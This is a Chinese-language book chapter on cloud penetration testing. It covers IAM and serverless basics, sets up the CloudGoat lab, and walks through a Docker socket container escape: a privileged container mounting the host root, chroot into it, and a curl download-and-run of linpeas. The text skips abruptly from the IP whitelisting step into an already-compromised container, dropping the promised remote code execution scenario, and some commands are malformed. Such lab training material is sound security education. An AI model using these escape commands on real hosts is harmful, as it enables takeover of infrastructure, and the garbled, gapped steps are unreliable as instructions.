# 第16章：云渗透测试

许多组织依赖云来托管其数据和应用程序。云是指租用服务器和软件的生态系统，组织可以选择使用这些服务，而不是在自己的设施内购买和维护服务器。大型科技公司，如谷歌、微软和亚马逊，将服务器存放在称为数据中心的大型仓库中，在那里他们允许其他组织付费安装和运行虚拟机。

虽然云提供商确保一定程度的安全性，但错误配置和漏洞仍然会导致严重的安全入侵。在本章中，我们将运行 Metasploit 和一些额外的工具来审计云环境，发现这些错误配置和漏洞。

我们将讨论保护云环境的基础知识，然后看两个示例场景：利用远程代码执行来控制运行网站的容器，以及执行权限提升攻击。

## 云安全基础

在本节中，我们将介绍云计算中使用的一些基本概念和术语，首先从云服务如何授予用户访问环境及其资源的权限开始。

### 身份与访问管理

身份与访问管理（IAM）工具定义了帐户的访问级别。IAM 控制认证（谁可以访问资源）和授权（他们可以执行哪些操作，通常称为权限）。在本章后面，你将使用 IAM 创建一个新用户帐户。

每个云平台对 IAM 的实现可能有所不同，但它们使用相同的基本概念。第一个是身份（identity），有时称为主体（principal），是一个通用术语，用于指代用户、组和角色。用户是与凭据（如用户名和密码对）关联的帐户，组是用户的集合。角色是不与凭据关联的特殊身份；相反，用户可以临时扮演一个角色。例如，他们可能扮演开发者角色、客户角色或管理员角色。角色可以授予权限，权限决定了可以对云资源执行的操作列表（例如，创建或删除虚拟机）。

最后，策略（policy）是将权限与身份关联起来的契约。例如，一个策略可能赋予某些身份创建和删除虚拟机的权限。如果这个策略与管理员角色关联，那么任何拥有管理员角色的人都可以执行这些操作。策略也可以将权限与云资源关联，从而允许一个云服务访问另一个云服务。例如，一个策略可能允许一个数据存储访问另一个数据存储。

管理员可以通过使用 IAM 仔细创建用户、组、角色、权限和策略来加固云环境。然而，IAM 的错误配置可能导致漏洞。例如，Cognito 是亚马逊网络服务（AWS）的一项服务，允许开发人员为他们构建的应用程序实现身份和访问管理。一个名为 Cognito Scanner 的工具允许你扫描该服务的错误配置。你可以在 https://github.com/padok-team/cognito-scanner 找到该工具。

与使用 Cognito 相关的漏洞属于更广泛的 Web API 漏洞类别，你可以在 Corey J. Ball 所著的《Hacking APIs: Breaking Web Application Programming Interfaces》（No Starch Press，2022）中了解更多信息。由于云服务不断发布新的 API 和服务，它们可能成为你开始审计的好地方，因为开发人员可能仍在学习如何安全地使用这些 API 和服务。

### 无服务器函数

无服务器函数（也称为云函数）允许开发人员运行服务器代码，而无需设置虚拟机。相反，开发人员编写他们的服务器端逻辑，云环境处理其余部分。每个云平台都有自己的此功能版本。例如，AWS 称其无服务器函数为 lambda 函数。

无服务器函数的概念可能看起来有些抽象，但我们可以通过编写一个 lambda 函数来实现一个简单的 Web API，以提供安全研究人员的名言，从而使其更具体。一个 lambda 函数将处理 API 请求并返回响应。

我们可以用多种语言编写 lambda 函数，包括 Python、Ruby、Java、Go、C#，甚至 PowerShell。我们将使用本书中一直使用的 Ruby 语言来编写：

```ruby
require 'json'

def lambda_handler(event:, context:)
  if event['queryStringParameters']['quote']&.downcase == 'true'
    response = {
      statusCode: 200,
      body: JSON.generate({
        quote: "My primary goal of hacking was the intellectual curiosity, the seduction of adventure... - Kevin Mitnick"
      })
    }
    return response
  end

  response = {
    statusCode: 400,
    body: JSON.generate({
      error: 'The "quote" parameter must be set to true.'
    })
  }
  return response
end
```

当用户向实现此函数的云服务发出 API 请求时，AWS API 网关会将请求转发给 lambda 函数。因此，每当 HTTP 请求到达 API 时，lambda 就会被触发。（你还可以配置 lambda 函数在其他事件上触发；仅在 lambda 函数运行时才需要付费。）

我们的示例 `lambda_handler` 函数接受两个参数：`event` 和 `context`。`event` 参数包含传递给 lambda 的触发事件数据。在这种情况下，API 网关传递表示 Web 请求的 JSON 对象。以下是 lambda 可能接收的 JSON 片段：

```json
{
  "resource": "/",
  "path": "/",
  "httpMethod": "GET",
  --snip--
  "headers": {
    "accept": "text/html",
    "accept-encoding": "gzip, deflate, br",
    --snip--
  },
  "multiValueHeaders": {
    --snip--
  },
  "queryStringParameters": {
    "quote": true
  },
  --snip--
}
```

`context` 变量提供有关调用 lambda 函数的环境信息。例如，它包含 `aws_request` 中的 `quote` 查询字符串参数。如果该参数设置为 `true`，则返回包含名言的响应；否则返回指示参数未设置的响应。

在运行 lambda 函数之前，我们需要通过向 AWS API 网关注册函数，告诉 AWS 将传入的 HTTP GET 请求注入到函数的 `event` 参数中。我们可以通过几次点击来完成此操作，如 AWS 官方文档所述：https://docs.aws.amazon.com/lambda/latest/dg/services-apigateway.html。

作为练习，尝试编写一个 Hello World lambda 函数，读取作为查询字符串提交的名称，并返回响应 `Hello <name>`。注册函数后，你就实现了一个无需创建服务器的 API。

无服务器函数容易受到多个安全问题的影响。要探索这些问题，请查看 OWASP 的 Serverless Goat，这是一个故意存在漏洞的无服务器应用程序。OWASP 还维护了无服务器应用程序中十大最关键漏洞的列表。

那么，如果你希望向用户返回大量数据，而不必将这些数据硬编码在函数中呢？你可以将数据存储在 S3 存储桶中，这将在下一节中讨论。

## Docker 容器

如果我们想编写一个使用外部库的 lambda 函数，该怎么办？我们需要一种方法将库与 lambda 函数捆绑在一起，以便将它们作为单个包部署到云环境中。

Docker 通过将应用程序及其所有依赖项捆绑到一个称为 Docker 镜像的单个包中，使应用程序能够在隔离环境中运行。这种隔离确保无论部署环境是你的本地机器还是云，应用程序都能一致地执行。

Docker 容器是这些镜像的可运行实例，使用 Docker 引擎创建和管理。Docker 引擎是一个客户端/服务器应用程序，由一个长期运行的守护进程、一个用于与守护进程交互的 REST API 和一个命令行界面客户端组成。

Docker 套接字是 Docker 守护进程使用的 Unix 套接字，作为 Docker 命令的端点，允许容器与守护进程通信、执行命令并接收响应。

为了更好地理解 Docker 的作用，以下 C 代码演示了如何设计一个简化的容器化环境。它不提供 Docker 的全部功能，但应该能说明基本概念：

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sched.h>
#include <sys/wait.h>
#include <unistd.h>

int childProcess(void *args) {
    printf("Inside the container!\n");
    execl("/bin/sh", "sh", NULL);
    return 1;
}

int main() {
    const int STACK_SIZE = 65536;
    char *stack = malloc(STACK_SIZE);
    if (!stack) {
        perror("Failed to allocate memory for the stack");
        exit(1);
    }

    int child_pid = clone(childProcess, stack + STACK_SIZE, SIGCHLD | CLONE_NEWUTS | CLONE_NEWPID | CLONE_NEWNS, NULL);

    if (child_pid == -1) {
        perror("Failed to clone process");
        free(stack);
        exit(1);
    }

    waitpid(child_pid, NULL, 0);
    free(stack);
    return 0;
}
```

我们首先定义 `_GNU_SOURCE` 以启用 GNU C 库的特定功能，这是 `clone` 系统调用所必需的。`clone` 系统调用创建一个新进程，类似于 `fork`。然而，它允许子进程与调用进程共享其执行上下文的部分内容，包括内存空间、文件描述符和进程上下文（如信号处理程序和进程 ID）。

我们还包含了几个头文件，用于标准输入/输出操作、内存分配、进程调度、等待函数以及后续程序中将要使用的 POSIX 操作系统 API。

接下来，我们定义 `childProcess` 函数，它将在我们创建的新隔离进程环境中运行。该函数打印一条消息表明它正在执行，并在隔离环境中使用 `execl` 启动一个新的 shell。

在 `main` 函数中，我们分配 64KB 内存作为子进程的栈。在检查分配过程中的错误后，我们使用 `clone` 系统调用创建一个新进程。我们还向 `clone` 传递了一个指向 `childProcess` 函数的函数指针，以便在新进程中执行该函数，该进程拥有自己的 Unix 分时系统、进程 ID 和挂载点命名空间。这些标志（`CLONE_NEWUTS`、`CLONE_NEWPID` 和 `CLONE_NEWNS`）告诉 `clone` 系统调用将新进程的主机名、进程 ID 和文件系统挂载点与主机隔离。

成功创建新进程后，它将独立运行，父进程使用 `waitpid` 等待其终止。子进程执行完毕后，我们释放分配的栈内存，确保不会发生内存泄漏。

这个程序是对进程隔离的基本说明，进程隔离是 Docker 容器设计和实现的关键原则。它强调了在独立命名空间中创建隔离进程，模拟了一个简化的容器环境。然而，它缺少完整的容器化解决方案（如 Docker）中的更高级功能，例如资源管理、高级文件系统隔离和全面的进程管理。

## 设置云测试环境

现在我们已经介绍了一些云计算概念，让我们设置一个练习渗透测试的环境。我们将使用 Rhino Security Labs 开发的 CloudGoat 来创建一个易受攻击的云部署。你可以在 https://github.com/RhinoSecurityLabs/cloudgoat 找到源代码。

访问 https://aws.amazon.com/free 创建一个免费的 AWS 账户。（即使你已有账户，也应该创建一个新账户，因为 CloudGoat 将部署易受攻击的配置。）创建账户后，安装 AWS 命令行界面（https://aws.amazon.com/cli）和 Docker（https://www.docker.com）。

CloudGoat 使用 Terraform 脚本来设置和销毁特定的 AWS 环境，每个环境都可以展示不同的攻击场景和漏洞。按照 https://developer.hashicorp.com/terraform/tutorials/aws-get-started/install-cli 上的说明安装 Terraform 命令行界面。

如果没有这些其他应用程序，CloudGoat Docker 容器将无法正确运行，因此在继续之前安装它们至关重要。接下来，运行 CloudGoat Docker 容器：

```bash
kali@kali:~$ sudo docker run -it rhinosecuritylabs/cloudgoat:latest
```

Docker 容器运行后，你需要将 AWS 命令行界面连接到 AWS 云。访问 https://console.aws.amazon.com/iam 并创建一个具有命令行界面访问权限的新用户。然后，单击“安全凭据”选项卡为此用户创建新的访问密钥。我们将使用此访问密钥将命令行界面连接到云。我们还将通过附加 `AdministratorAccess` 策略来授予该用户管理员访问权限。

容器启动后，你的命令提示符将从 `kali@kali` 更改为类似 `4b80f3fc000a:/usr/src/cloudgoat` 的内容。值 `4b80f3fc000a` 表示容器 ID，它唯一标识你在机器上运行的每个 Docker 容器。你的 ID 可能不同。

在容器中运行以下命令创建一个配置文件，并提供你刚刚创建的密钥。对于所有其他选项，选择默认值：

```bash
4b80f3fc000a:/usr/src/cloudgoat# aws configure --profile met abook
AWS Access Key ID [None]: AKUNDPXQGFTDPR6BYM5V
AWS Secret Access Key [None]: pITyN4YeFnGT5pAHPLkGkPWvk1Nj9iUIoGbofABh
```

命令行界面现在可以使用此配置文件与云通信。接下来，告诉 CloudGoat 使用哪个配置文件。运行以下命令，然后输入你刚刚创建的配置文件的名称。此示例将配置文件命名为 `metabook`：

```bash
4b80f3fc000a:/usr/src/cloudgoat# ./cloudgoat.py config profile

Would you like to create this file with a default profile name now? [y/n]: y
```

CloudGoat 将云环境的访问限制在白名单文件 `.whitelist.txt` 中的 IP 地址。运行以下命令将你的 IP 地址列入白名单：


注意输出中的 Docker 文件，表明我们位于一个 Docker 容器内部。获得通用 shell 后，按 CTRL-Z 将其置于后台，并使用 `session -u <会话号>` 命令升级 shell。

## 逃逸 Docker 容器

我们已经攻破了 Docker 容器，但这个容器将我们与托管它的虚拟服务器隔离开。如果容器配置正确，攻击者应该无法访问虚拟主机或其运行的任何其他容器上的信息。让我们看看我们是否能逃逸容器，在主机服务器上运行命令并访问其他容器。

我们将首先查找容器权限中的错误配置，因为特权容器通过 Docker 套接字与 Docker 守护进程通信。攻击者可以使用 Docker 套接字指示守护进程创建一个挂载到主机文件系统根目录的新容器，然后读取、写入和修改主机系统上的文件。

让我们检查容器是否有权访问 Docker 套接字。在你之前注入的 shell 中输入以下内容：

```bash
find / -name docker.sock 2>/dev/null
/var/run/docker.sock
```

看起来我们有权访问 Docker 套接字。检查我们是否在特权容器中运行的另一种方法是使用 `docker info` 命令。

现在，我们将尝试指示守护进程给我们一个镜像列表。这里，我们指定了套接字的路径，但如果套接字在 run 目录中，通常不需要指定：

```bash
docker -H unix:///var/run/docker.sock image ls
REPOSITORY                           TAG                  IMAGE ID       CREATED        SIZE
amazon/amazon-ecs-agent              latest               cc90f5f5fb60   3 weeks ago    69.4MB
ecs-service-connect-agent-interface  v1.5                 ac163fd8e67    7 weeks ago    91.4MB
busybox                              latest               a416a98b71e2   3 months ago   4.26MB
cloudgoat/ecs-takeover...            latest               cf9da13f75ef   2 years ago    635MB
amazon/amazon-ecs-pause              0.1.0                9dd4685d3644   8 years ago    702KB
```

太好了，看起来我们有控制权。让我们查看这个镜像列表，看看是否能找到一个可以用于访问主机文件系统的镜像。我们正在寻找一个 Unix 或 Windows 容器。如果不存在合适的容器，我们使用 `docker pull` 下载并安装一个：

```bash
docker pull alpine:latest
```

接下来，我们通过运行以下命令指示 Docker 守护进程在 Alpine Linux 容器中创建一个名为 `host` 的文件夹，并将其映射到主机上的根目录：

```bash
docker run -v /:/host --rm -it --privileged alpine cap-add=ALL chroot /host bash
# ls /bin
bin dev
--snip--
```

`chroot` 命令将使映射的 `/host` 文件夹成为我们的默认根目录。我们通过使用 `--privileged` 和 `cap-add=ALL` 标志创建了一个具有所有能力的特权容器。

要找到其他权限提升途径，请运行特权提升 Awesome 脚本套件（PEASS）。将 PEASS 下载到容器中：

```bash
curl -k -OL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh > linpeas.out
```

PEASS 应该允许你快速审计 Docker 容器并识别错误配置，以及容器逃逸或权限提升的机会。PEASS 的作者开发了一个后渗透 Metasploit 模块。你可以通过运行以下命令将其添加到你的环境中：

```bash
kali@kali:~$ sudo wget https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/Metasploit/peass.rb
msf > reload_all
```

下载脚本后，运行 `reload_all` 命令使其在框架中可用。

当你使用完易受攻击的容器后，记得清理它：

```bash
b8c57701e2a8:/usr/src/cloudgoat# ./cloudgoat.py destroy ecs_takeover
Using default profile "metabook" from config.yml...
Destroy "ecs_takeover_cgidstcla13xzv"? [y/n]: y
```

在使用实验环境后执行这些清理步骤至关重要，以避免收到高额的托管账单。

## Kubernetes

复杂的软件应用程序通常使用一组相互连接的 Docker 容器，这种设计方法称为微服务架构。为了确保这些 Docker 容器能够正确地相互交互，它们通常依赖于编排工具 Kubernetes，这是一个由 Google 开发的强大平台，用于管理容器化服务。DevOps 工程师和软件开发人员必须精确配置 Kubernetes，因为任何错误配置都可能引入安全漏洞。

云安全领域是动态且快速发展的。因此，我们不会在这里介绍 Kubernetes 的漏洞利用。对于那些热衷于深入了解 Kubernetes 的人，可以参阅 Kubernetes Goat，这是一个为培训目的而创建的故意易受攻击的集群环境，可在 https://github.com/madhukula/kubernetes-goat 获得。

云安全是一个广阔且不断发展的领域。随着技术的发展和新的挑战的出现，渗透测试人员必须保持警惕和道德操守。

要获得更多攻击 S3 漏洞的练习，请查看 http://flaws.cloud。要利用其他云解决方案，如微软的 Azure Blob 存储，你可以使用像 Az-Blob-Attacker（https://github.com/VithalS/Az-Blob-Attacker）这样的工具。要自动化本章描述的 Docker 权限提升步骤，请参阅 stealthchapter 的 `deepce` 脚本（https://github.com/stealthchapter/deepce）和 PercussiveElbow 的 `docker-escape-tool`（https://github.com/PercussiveElbow/docker-escape-tool）。
